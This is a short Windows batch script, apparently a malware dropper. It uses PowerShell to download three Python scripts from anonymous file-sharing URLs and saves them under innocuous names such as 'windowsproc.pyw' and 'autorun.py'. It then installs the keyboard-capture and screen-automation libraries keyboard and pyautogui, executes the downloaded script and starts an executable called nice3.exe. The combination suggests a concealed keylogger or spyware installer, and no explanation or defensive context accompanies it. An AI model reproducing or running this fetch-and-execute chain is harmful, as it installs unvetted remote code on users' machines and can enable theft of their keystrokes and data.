@echo off




powershell -Command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/VhHL7197/download', 'windowsproc.pyw')"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/R2xeN37z/download', 'autorun.py')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://filetransfer.io/data-package/FROpnfgh/download', 'buildexe.py')"


pip3 install pyinstaller
pip3 install keyboard
pip3 install tk
pip3 install pyautogui

cd %~dp0

@for %%i in (python.exe) do @set py=%%~$PATH:i
@echo %py%

%py% "autorun.py"

@REM "C:\ProgramData\Anaconda3\python.exe" "autorun.py"
start /d %~dp0 nice3.exe